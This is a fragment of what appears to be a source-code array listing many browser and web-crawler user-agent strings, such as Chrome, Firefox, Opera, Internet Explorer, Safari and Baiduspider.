	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"TheSuBot/0.2 (www.thesubot.de)",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8", 
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01", 
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36", // Mavericks PC
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; PRU_IE; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPad4,1;FBMD/iPad;FBSN/iPhone OS;FBSV/8.4.1;FBSS/2; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP02; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (X11; CrOS x86_64 6946.63.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.2.2; QMV7B Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
"Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4343.1028; Windows NT 6.1; WOW64; Trident/7.0)",
"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Active Content Browser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; WebView/1.0)",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36",
"Mozilla/5.0 (iPad; U; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
  "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
  "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
  "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
